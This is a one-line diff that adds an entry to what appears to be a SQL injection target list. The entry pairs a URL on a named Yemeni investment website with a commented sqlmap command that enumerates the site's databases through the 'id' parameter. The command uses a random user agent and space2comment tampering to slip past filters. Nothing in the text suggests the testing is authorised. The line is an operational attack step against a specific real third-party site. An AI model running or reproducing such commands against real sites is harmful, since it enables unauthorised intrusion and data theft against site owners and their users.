@@ -1,0 +1,1 @@
+http://www.yemeninvest.org/news_detail.php?id=123 (GET)  # sqlmap.py -u http://www.yemeninvest.org/news_detail.php?id=123 --random-agent --tamper=space2comment --batch --dbs
